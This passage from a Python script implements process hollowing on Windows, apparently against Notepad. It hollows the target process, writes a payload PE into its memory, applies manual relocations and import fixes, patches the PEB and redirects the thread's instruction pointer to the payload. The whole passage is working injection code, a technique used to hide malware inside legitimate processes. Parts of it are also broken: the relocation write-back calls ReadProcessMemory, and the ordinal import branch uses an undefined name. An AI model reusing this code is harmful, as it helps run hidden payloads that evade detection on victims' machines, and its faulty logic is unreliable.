    
    # set ContextFlags to CONTEXT_ALL, @ offset 48 <- return all registers
    struct.pack_into("<I", aligned_buffer, CTX_X64_CONTEXT_FLAGS, CONTEXT_ALL)


    # ---------- GET: Current state of thread's registers ----------
    print(f"\n[+] Capturing current thread state: ", end='')
    if not kernel32.GetThreadContext(hThread, aligned_addr):
        raise winerr()
    print("Success")


    # ----- Save original values for important registers
    original_rip = struct.unpack_from("<Q", aligned_buffer, CTX_X64_RIP)[0]
    original_rsp = struct.unpack_from("<Q", aligned_buffer, CTX_X64_RSP)[0]
    original_rcx = struct.unpack_from("<Q", aligned_buffer, CTX_X64_RCX)[0]

    
    # Apply re-direction - Rip and Rcx
    struct.pack_into("<Q", aligned_buffer, CTX_X64_RIP, entry_point_va) # Rip
    struct.pack_into("<Q", aligned_buffer, CTX_X64_RCX, entry_point_va)

    
    # ----- Instruction Pointer @ offset 248
    print(f"\n[+] Adjusting Instruction Pointer:")
    print(f"    -> Orig Rip: {hex(original_rip)}")
    print(f"    -> New Rip:  {hex(entry_point_va)}")

    # ----- Rcx - First Integer Argument Register
    
    print(f"\n[+] Adjusting Rcx - first integer arg register:")
    print(f"    -> Orig Rcx: {hex(original_rcx)}")
    print(f"    -> New Rcx:  {hex(entry_point_va)}")


    # ----- Stack Pointer @ offset 152
    #
    # - align to 16-bytes boundry
    # - reserve Shadow Space on stack to save/restore values from function calls
    print(f"\n[+] Adjusting Stack Pointer Alignment:")

    #new_rsp = (original_rsp & ALIGNMENT_MASK) - SHADOW_SPACE
    new_rsp = (original_rsp & ALIGNMENT_MASK) - SHADOW_SPACE - RET_ADDR_SIZE
    struct.pack_into('<Q', aligned_buffer, CTX_X64_RSP, new_rsp)
    print(f"    -> Old Rsp:           {hex(original_rsp)}")
    print(f"    -> New Rsp (Aligned): {hex(new_rsp)}")


    # apply changes
    print(f"\n[+] Redirecting Instruction Pointer to new entrypoint: SetThreadContext()")
    if not kernel32.SetThreadContext(hThread, aligned_addr):
        raise winerr()
    print(f"    -> Successful")



def get_payload_preferred_base(payload_path):
    with open(payload_path, 'rb') as f:
        # 1. Get PE Header offset from DOS header (0x3C)
        f.seek(PE_OFFSET)
        pe_offset = struct.unpack('<I', f.read(4))[0]
        
        # 2. Preferred ImageBase is in the Optional Header
        # Offset: PE_Header + Signature(4) + FileHeader(20) + ImageBaseOffset(24)
        image_base_offset = pe_offset + 4 + 20 + 24 
        
        f.seek(image_base_offset)
        # Read 8 bytes for 64-bit ImageBase
        preferred_base = struct.unpack('<Q', f.read(8))[0]
        
        return preferred_base




def perform_manual_relocation(hProcess, lpBaseAddress, preferred_base, payload_path):
    """
    Here we perform a manual Base Relocation
    - in order to address discrepancies between the 'Preferred Base' and 'Actual Base'
    
    When a PE file executes, it has a 'Preferred Base', (eg 0x140000000)
    - compiler hard-codes every pointer (to strings/var etc) using this address as a reference
    - however, when target process hollowed, VirtualAllocEx() will return a random address (Actual Base)
    - hard-coded pointers are now all wrong -> point to empty space where compiler thought strings/vars would be

    To keep in mind:
    - here we are dealing with two different 'tables'
    - Section Table -> find which section contains reloc_va
    - Base Relocation Table -> iterate through each block, and data within
    
    Summary:
    - manually parse '.reloc' and patch Absolute memory addresses in target process
    - read relocation table from file, ON DISK
    - patch the memory of the target / hollowed process

    Steps:
    - find Relative Virtual Address (reloc_va) of the Base Relocation Table
    - iterate through SectionTable blocks/sections -> find section that contains reloc_va
    - if v_addr <= reloc_va < (v_addr + v_size), then you have found the right section
    - here, look at PointerToRawData, the offset/address where relocation table begins, ON DISK
    - iterate through table, patch memory addresses
    
    Why not just find section named '.reloc' directly?
    - guaranteed 4+ sections (.text, .rdata, .data, .reloc etc)
    - however these are 'standard' names and not guaranteed to named such
    - relocation table typically stored in .reloc, but not guaranteed to be this name
    - therefore iterate through all section headers
    
    """
    delta = lpBaseAddress - preferred_base
    
    if delta == 0:
        print(f"[!] Delta is 0, skipping relocation")
        return
        
    print(f"\n[+] Performing Manual Relocation, (delta: {hex(delta)})")
    
    with open(payload_path, 'rb') as f:
        # get relocation directory info (virtual address, and size)
        f.seek(get_reloc_dir_offset(f))
        
        # start address of entire relocation database for payload
        reloc_va   = struct.unpack('<I', f.read(4))[0]  
        reloc_size = struct.unpack('<I', f.read(4))[0]
        
        if reloc_va == 0:
            print(f"[!!] No relocation table found in payload.")
            return


        # Iterate through Section Table (array of Section Headers)
        # - find correct section (likely '.reloc'
        #
        # Section Header layout (, bytes)
        # [Name, 8]
        # [VirtualSize,     4] [VirtualAddress, 4]
        # [SizeOfRawData,   4] [PtrToRawData,   4]
        # [PtrToRelocs,     4] [PtrToLineNums,  4]
        # [NumOfRelocs,     2] [NumOfLineNums,  2]
        # [Characteristics, 4] <- flags, executable/writable?
        num_sections = get_number_of_sections_in_section_table(f)
        section_table_ptr = get_section_table_offset(f)
        reloc_file_ptr = 0

        for i in range(num_sections):
            f.seek(section_table_ptr + (i * SECTION_HEADER_SIZE))
                
            # read VirtualSize, VirtualAddress, and PtrToRawData
            f.seek(8, 1)    # skip name
            v_size, v_addr = struct.unpack('<II', f.read(8))
            f.seek(4,1)     # skip SizeOfRawData -> PointerToRawData
            ptr_to_raw_data = struct.unpack('<I', f.read(4))[0]
            
            if v_addr <= reloc_va < (v_addr + v_size):
                # translate memory addres, into a file address
                # - find exact byte offset where relocation data begins
                reloc_file_ptr = ptr_to_raw_data + (reloc_va - v_addr)
                break
                
        if reloc_file_ptr == 0:
            print(f"[!] Coule not map Relocation Virtual Address, to file offset.")
            return
            
            
        # iterate through Relocation Blocks
        #
        # Memory layout [field, Bytes]
        # [VirtualAddress,  4]  - rva of 4KB 'page' being patched (page_rva)
        # [SizeOfBlock,     4]  - total size of block, header + entries
        # [TypeOffset[0],   2]
        # [TypeOffset[1],   2]
        # [TypeOffset[n],   2]
        #
        # TypeOffset memory layout [field, bits]
        # [Type,     4] - here we look for Type 10, 'IMAGE_REL_BASED_DIR54'
        # [Offset,  12]
        
        current_offset = 0
        while current_offset < reloc_size:
            f.seek(reloc_file_ptr + current_offset)
            
            page_rva    = struct.unpack('<I', f.read(4))[0]
            size_block  = struct.unpack('<I', f.read(4))[0]

            if size_block == 0: break
            
            # iterate through each entry, 2-bytes each
            # - subtract header size to find how many bytes of entries to iterate
            # - divide by entry_size, to determine number of entries
            num_entries = (size_block - RELOC_BLOCK_HEADER_SIZE) // RELOC_ENTRY_SIZE
            
            for _ in range(num_entries):
                entry = struct.unpack('<H', f.read(2))[0]
                
                # find Type -> shift right by 12 to isolte top 4 bits
                reloc_type = entry >> RELOC_TYPE_BITSHIFT
                
                # find Offset -> bitwise AND with 0x0fff to isolate bottom 12 bits
                reloc_offset = entry & RELOC_OFFSET_MASK

                # If Type 10 (IMAGE_REL_BASED_DIR64) -> patch address
                if reloc_type == 10:
                    patch_addr = int(lpBaseAddress) + page_rva + reloc_offset
                    
                    # read current value at pointer address
                    orig_val = ctypes.c_uint64(0)
                    kernel32.ReadProcessMemory(
                        hProcess,
                        ctypes.c_void_p(patch_addr),
                        ctypes.byref(orig_val),
                        ctypes.sizeof(orig_val),
                        None)
                        
                    # apply delta -> write back
                    fixed_val = ctypes.c_uint64(orig_val.value + delta)
                    kernel32.ReadProcessMemory(
                        hProcess,
                        ctypes.c_void_p(patch_addr),
                        ctypes.byref(fixed_val),
                        ctypes.sizeof(orig_val),
                        None)
                        
                    print(f"Patching at {hex(patch_addr)}: {hex(orig_val.value)} -> {hex(fixed_val.value)}")

            # increment offset to next block
            current_offset += size_block    

    print(f"[!!!!!] Relocation Complete [!!!!!]")
                
# --------------- Execution ---------------


def resume_orig_process(
    hThread: wintypes.HANDLE,
    dwThreadId: wintypes.DWORD,
    dwProcessId: wintypes.DWORD
) -> None:
    
    """ Resume execution of original process/thread """

    print(f"\n[+] Resuming original thread:")
    print(f"    -> ProcessId: {dwProcessId}")
    print(f"    -> ThreadId: {dwThreadId}")
    
    kernel32.ResumeThread(hThread)



def rva_to_file_offset(f, rva):
    """ Helper to convert RVA to raw file offset using the Section Table """
    pe_offset = get_pe_header_offset(f)
    sec_table = get_section_table_offset(f)
    f.seek(get_file_header_offset(f) + 2) # NumberOfSections
    num_sec = struct.unpack('<H', f.read(2))[0]
    
    for i in range(num_sec):
        f.seek(sec_table + (i * 40) + 8) # Skip name
        v_size, v_addr, r_size, r_ptr = struct.unpack('<IIII', f.read(16))
        if v_addr <= rva < (v_addr + v_size):
            return r_ptr + (rva - v_addr)
    return 0


"""
Break this up, currently doing the following jobs:
- parsing DLL list
- loading dependencies
- resolving individual functions



"""
def fix_iat_manual(hProcess, lpBaseAddress, payload_path):
    print(f"\n[+] Fixing Import Address Table (IAT) Manually:")
    
    with open(payload_path, 'rb') as f:
        # 1. Get offsets
        pe_offset = get_pe_header_offset(f)
        opt_hdr_offset = get_optional_header_offset(f)
        
        # 2. Get Import Directory Info (Index 1 of Data Directories)
        import_dir_entry = opt_hdr_offset + OPT_HDR_DATA_DIRECTORIES + (DIR_IMPORT * DATA_DIRECTORY_SIZE)
        f.seek(import_dir_entry)
        import_va = struct.unpack('<I', f.read(4))[0]
        import_size = struct.unpack('<I', f.read(4))[0]

        if import_va == 0:
            print("    -> No imports found.")
            return

        # 3. Find file offset for the Import Descriptor Array
        # (Re-use your section-finding logic from the Relocation function)
        import_file_ptr = rva_to_file_offset(f, import_va)
        
        # 4. Iterate through IMAGE_IMPORT_DESCRIPTORs (20 bytes each)
        # Array ends with a null-filled descriptor
        descriptor_idx = 0
        while True:
            f.seek(import_file_ptr + (descriptor_idx * 20))
            # OriginalFirstThunk (0), Name (12), FirstThunk (16)
            oft_va, timestamp, forwarder, name_va, ft_va = struct.unpack('<IIIII', f.read(20))
            
            if name_va == 0: break # Null descriptor marks the end
            
            # Get DLL name from file
            f.seek(rva_to_file_offset(f, name_va))
            dll_name = b""
            while True:
                char = f.read(1)
                if char == b"\x00": break
                dll_name += char
            dll_str = dll_name.decode()
            
            # Load DLL in our process to get its base
            dll_name = dll_name.split(b'\x00')[0]
            h_dll = kernel32.LoadLibraryA(dll_name)
            
            # if it fails, try to see if its already in memory
            if not h_dll:
                h_dll = kernel32.GetModuleHandleA(dll_name)
                
            if not h_dll:
                print(f"[!] CRITICAL [!]: Could not find/load {dll_name.decode()}")
 
            
            print(f"    -> Resolving imports for {dll_str}...")

            # 5. Iterate through Thunks (Functions)
            # Use OriginalFirstThunk (INT) to find names, patch into FirstThunk (IAT)
            thunk_idx = 0
            while True:
                # Read 8 bytes for x64 thunk
                f.seek(rva_to_file_offset(f, oft_va) + (thunk_idx * 8))
                thunk_val = struct.unpack('<Q', f.read(8))[0]
                
                if thunk_val == 0: break # End of function list
                
                # Check if imported by Ordinal (high bit set)
                if thunk_val & 0x8000000000000000:
                    ordinal = thunk_val & 0xFFFF
                    func_name = func_name.split(b'\x00')[0]
                    func_addr = kernel32.GetProcAddress(h_dll, ctypes.c_void_p(ordinal))
                else:
                    # Imported by Name: Skip 2-byte 'Hint', read name string
                    f.seek(rva_to_file_offset(f, thunk_val) + 2)
                    func_name = b""
                    while True:
                        char = f.read(1)
                        if char == b"\x00": break
                        func_name += char
                    func_addr = kernel32.GetProcAddress(h_dll, func_name)

                if func_addr:
                    print(f"[-] IAT {dll_str} -> {func_name.decode() if 'func_name' in locals() else 'Orginal' + str(ordinal)} @ {hex(func_addr)}")
                else:
                    print(f"[!!!!] FAILED to resolve: {dll_str} -> {func_name if 'func_name' in locals() else ordinal}") 


                # 6. Write resolved address into Target Process IAT
                # Target IAT Entry = lpBaseAddress + FirstThunk_VA + offset
                iat_entry_va = lpBaseAddress + ft_va + (thunk_idx * 8)
                kernel32.WriteProcessMemory(
                    hProcess,
                    ctypes.c_void_p(iat_entry_va), 
                    ctypes.byref(ctypes.c_uint64(func_addr)), 
                    8, 
                    None)
                
                thunk_idx += 1
            descriptor_idx += 1

    print("    -> IAT Fix Complete.")




def patch_peb(hProcess: wintypes.HANDLE, PROCESS_BASIC_INFORMATION, lpBaseAddress: int) -> None:
    print(f"\n[+] Patching PEB to point to new ImageBase: WriteProcessMemory()")

    peb_image_base_ptr = pbi.PebBaseAddress + 0x10
    new_base_buffer = ctypes.c_uint64(int(lpBaseAddress))

    if not kernel32.WriteProcessMemory(
        hProcess,
        ctypes.c_void_p(peb_image_base_ptr),
        ctypes.byref(new_base_buffer),
        ctypes.sizeof(new_base_buffer),
        None
    ):
        print(f"[!] Failed to patch PEB: {winerr()}")
    else:
        print(f"    -> PEB Updated, now  points to: {hex(lpBaseAddress)}")





##########################################
##### Main functionality starts here #####
##########################################

# create target process <- return handle/Ids to thread/process
hThread, hProcess, dwThreadId, dwProcessId = create_process()




# ------------------------------------------------------
hdr = "\n >>>>    Phase: Gathering Process Information    <<<<\n"
print_hdr(hdr)

# return base address, of where target process is loaded
pbi, img_base_addr = get_img_base_addr(hProcess)




# ------------------------------------------------------
hdr = "\n >>>>    Phase: Calculating Entry Point    <<<<\n"
print_hdr(hdr)

# calculate various entry points - for payload (on disk, in memory)
payload_oep_rva = get_oep_rva(payload)





# ------------------------------------------------------
hdr = "\n >>>>    Phase: Memory Manipulation    <<<<\n"
print_hdr(hdr)

# hollow out target process
hollow_process(hProcess, img_base_addr)

# retrieve SizeOfImage for payload
with open(payload, 'rb') as f:
    size_of_payload = get_size_of_image(f)


preferred_base = get_payload_preferred_base(payload)
print(f"[!!] Preferred base: {hex(preferred_base)}")


# allocate memory / write payload
lpBaseAddress = virtual_alloc_ex(hProcess, preferred_base, size_of_payload)
write_payload(hProcess, lpBaseAddress, payload)



# ----- Apply fixes
perform_manual_relocation(hProcess, lpBaseAddress, preferred_base, payload)
patch_peb(hProcess, pbi, lpBaseAddress)



fix_iat_manual(hProcess, lpBaseAddress, payload)







# ------------------------------------------------------
hdr = "\n >>>>    Phase: Execution Redirection    <<<<\n"
print_hdr(hdr)


actual_entry_point = lpBaseAddress + payload_oep_rva
redirect_to_payload(hThread, actual_entry_point)





# ------------------------------------------------------
hdr = "\n >>>>    Phase: Execution    <<<<\n"
print_hdr(hdr)

# confirm execution of payload
# pause(warning=True)

# resume execution of original thread/process
resume_orig_process(hThread, dwThreadId, dwProcessId)




# ------------------------------------------------------
hdr = "\n >>>>    Phase: Clean-up    <<<<\n"
print_hdr(hdr)

# close all handles
print()
close_handle(hThread, "Notepad Thread")
close_handle(hProcess, "Notepad Process")
